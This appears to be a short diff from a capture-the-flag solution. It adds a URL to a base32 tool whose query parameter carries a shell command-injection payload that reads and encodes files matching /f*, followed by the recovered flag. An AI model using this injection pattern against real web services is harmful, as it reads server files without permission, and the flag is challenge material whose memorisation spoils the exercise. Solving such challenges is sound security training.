@@ -1,0 +1,2 @@
+https://base32.splitline.tw/?string=$(head /f*|base32)
+FLAG{b64d(Y29tbWFuZF8xbmozY3QxMG4h)}
